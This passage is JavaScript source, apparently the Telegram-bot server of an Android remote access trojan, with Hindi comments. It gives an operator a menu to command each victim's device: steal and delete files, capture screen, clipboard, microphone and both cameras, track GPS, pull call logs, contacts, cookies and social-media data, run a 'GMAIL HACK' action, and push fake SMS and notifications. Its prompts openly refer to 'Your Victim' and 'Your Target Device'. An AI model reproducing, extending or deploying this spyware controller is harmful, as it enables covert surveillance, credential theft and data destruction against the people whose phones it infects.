            ws.send(command);
            sent = true;
        }
    });
    return sent;
}

// ==================== कॉलबैक क्वेरी हैंडलर ====================
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id.toString();
    const data = callbackQuery.data;
    const command = data.split(':')[0];
    const uuid = data.split(':')[1];
    
    // वेरिफाई करो कि यह डिवाइस इसी यूजर का है
    const deviceOwner = getUserIdByDevice(uuid);
    if (deviceOwner !== chatId) {
        appBot.answerCallbackQuery(callbackQuery.id, { text: '❌ This device is not yours!' });
        return;
    }
    
    console.log(`Command ${command} for device ${uuid} by user ${chatId}`);
    
    if (command == 'device') {
        const deviceInfo = userDevices.get(chatId)?.get(uuid);
        if (!deviceInfo) return;
        
        userCurrentUuid.set(chatId, uuid);
        
        appBot.editMessageText(`°• 🪣𝐒𝐞𝐥𝐞𝐜𝐭 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐅𝐨𝐫 𝐓𝐡𝐢𝐬 𝐌𝐚𝐜𝐡𝐢𝐧𝐞📬 : <b>${deviceInfo.model}</b>`, {
            width: 10000,
            chat_id: chatId,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🍏𝐀𝐏𝐏𝐒🍏', callback_data: `apps:${uuid}` },
                     { text: '⚽𝐏𝐇𝐎𝐍𝐄 𝐈𝐍𝐅𝐎⚽', callback_data: `device_info:${uuid}` }],
                    [{ text: '🍫𝐆𝐄𝐓 𝐅𝐢𝐋𝐄🍫', callback_data: `file:${uuid}` },
                     { text: '🏆𝐃𝐄𝐋𝐄𝐓𝐄 𝐅𝐢𝐋𝐄🏆', callback_data: `delete_file:${uuid}` }],
                    [{ text: '🧨𝐋𝐢𝐕𝐄 𝐒𝐂𝐑𝐄𝐄𝐍🧨', callback_data: `screenshot:${uuid}` },
                     { text: '☎️𝐅𝐁/𝐈𝐍𝐒𝐓𝐀/𝐓𝐆☎️', callback_data: `whatsapp:${uuid}` }],
                    [{ text: '⛄𝐂𝐋𝐈𝐏𝐁𝐎𝐀𝐑𝐃⛄', callback_data: `clipboard:${uuid}` },
                     { text: '🥤𝐒𝐎𝐔𝐍𝐃 𝐑𝐄𝐂𝐎𝐑𝐃🥤', callback_data: `microphone:${uuid}` }],
                    [{ text: '📸𝐁𝐀𝐂𝐊 𝐂𝐀𝐌𝐄𝐑𝐀📷', callback_data: `camera_main:${uuid}` },
                     { text: '🚸𝐅𝐑𝐎𝐍𝐓 𝐂𝐀𝐌𝐄𝐑𝐀🚸', callback_data: `camera_selfie:${uuid}` }],
                    [{ text: '📟𝐋𝐢𝐕𝐄 𝐆𝐏𝐒📟', callback_data: `location:${uuid}` },
                     { text: '🖥️𝐄𝐂𝐇𝐎 𝐒𝐌𝐒🖥️', callback_data: `toast:${uuid}` }],
                    [{ text: '🥃𝐂𝐎𝐎𝐊𝐈𝐄🥃', callback_data: `Settings:${uuid}` },
                     { text: '🍁𝐆𝐌𝐀𝐈𝐋 𝐇𝐀𝐂𝐊🍁', callback_data: `Erase_data:${uuid}` }],
                    [{ text: '🎻𝐂𝐀𝐋𝐋 𝐇𝐢𝐒𝐓𝐎𝐑𝐘🎻', callback_data: `calls:${uuid}` },
                     { text: '♐𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐋𝐢𝐒𝐓♐', callback_data: `contacts:${uuid}` }],
                    [{ text: '🚳𝐕𝐢𝐁𝐑𝐀𝐓𝐄🚳', callback_data: `vibrate:${uuid}` },
                     { text: '🏖️𝐍𝐎𝐓𝐢-𝐅𝐢𝐂𝐀𝐓𝐢𝐎𝐍🏖️', callback_data: `show_notification:${uuid}` }]
                ]
            },
            parse_mode: "HTML"
        });
        appBot.answerCallbackQuery(callbackQuery.id);
    }
    
    // Simple commands (बिना इनपुट वाले)
    const simpleCommands = ['apps', 'device_info', 'screenshot', 'whatsapp', 'clipboard', 'location', 
                           'calls', 'contacts', 'vibrate', 'Settings', 'Erase_data'];
    if (simpleCommands.includes(command)) {
        sendCommandToDevice(uuid, command);
        appBot.deleteMessage(chatId, msg.message_id);
        appBot.sendMessage(chatId,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...',
            {
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        );
        appBot.answerCallbackQuery(callbackQuery.id);
        return;
    }
    
    // Commands that need input (inline से रिप्लाई पर ले जाना)
    const inputCommands = ['file', 'delete_file', 'microphone', 'camera_main', 'camera_selfie', 
                          'toast', 'show_notification', 'send_message'];
    if (inputCommands.includes(command)) {
        let promptText = '';
        if (command == 'send_message') {
            promptText = '°• 🗯️𝐑𝐞𝐩𝐥𝐲 𝐎𝐟 𝐘𝐨𝐮𝐫 𝐕𝐢𝐜𝐭𝐢𝐦 𝐌𝐞𝐬𝐬𝐚𝐠𝐞🌨️';
        } else if (command == 'file') {
            promptText = '°• 🍬𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐏𝐚𝐭𝐡 𝐎𝐟 𝐖𝐡𝐚𝐭𝐞𝐯𝐞𝐫 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝📻';
        } else if (command == 'delete_file') {
            promptText = '°• 🌠𝐆𝐢𝐯𝐞 𝐓𝐡𝐞 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧 𝐎𝐟 𝐖𝐡𝐚𝐭𝐞𝐯𝐞𝐫 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐃𝐞𝐥𝐞𝐭𝐞🗑️';
        } else if (command == 'microphone') {
            promptText = '°• 🕍𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐓𝐢𝐦𝐞 𝐨𝐟  𝐘𝐨𝐮  𝐖𝐚𝐧𝐭 𝐑𝐞𝐜𝐨𝐫𝐝 𝐌𝐢𝐜𝐫𝐨𝐩𝐡𝐨𝐧𝐞🦮';
        } else if (command == 'camera_main') {
            promptText = '°• 🎢𝐄𝐧𝐭𝐞𝐫 𝐇𝐨𝐰 𝐋𝐨𝐧𝐠 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐡𝐞 𝐌𝐚𝐢𝐧 𝐂𝐚𝐦𝐞𝐫𝐚 𝐓𝐨 𝐁𝐞 𝐑𝐞𝐜𝐨𝐫𝐝𝐞𝐝🏠';
        } else if (command == 'camera_selfie') {
            promptText = '°• 🚒𝐄𝐧𝐭𝐞𝐫 𝐇𝐨𝐰 𝐋𝐨𝐧𝐠 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐡𝐞 𝐒𝐞𝐥𝐟𝐞 𝐂𝐚𝐦𝐞𝐫𝐚 𝐓𝐨 𝐁𝐞 𝐑𝐞𝐜𝐨𝐫𝐝𝐞𝐝🚆';
        } else if (command == 'toast') {
            promptText = '°• 🎒𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐒𝐌𝐒 𝐓𝐡𝐚𝐭 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐒𝐡𝐨𝐰 𝐨𝐧 𝐘𝐨𝐮𝐫 𝐓𝐚𝐫𝐠𝐞𝐭 𝐃𝐞𝐯𝐢𝐜𝐞☂️';
        } else if (command == 'show_notification') {
            promptText = '°• 🦊𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐀𝐩𝐩𝐞𝐚𝐫 𝐀𝐬 𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧👹';
        }
        
        // पुराने मैसेज को एडिट करो
        appBot.editMessageText(promptText, {
            chat_id: chatId,
            message_id: msg.message_id,
            reply_markup: { force_reply: true }
        });
        appBot.answerCallbackQuery(callbackQuery.id);
    }
});

// ==================== SERVER START ====================
const PORT = process.env.PORT || 3000;
appServer.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`🌐 Web: http://localhost:${PORT}`);
    console.log(`🔌 WebSocket: ws://localhost:${PORT}`);
});
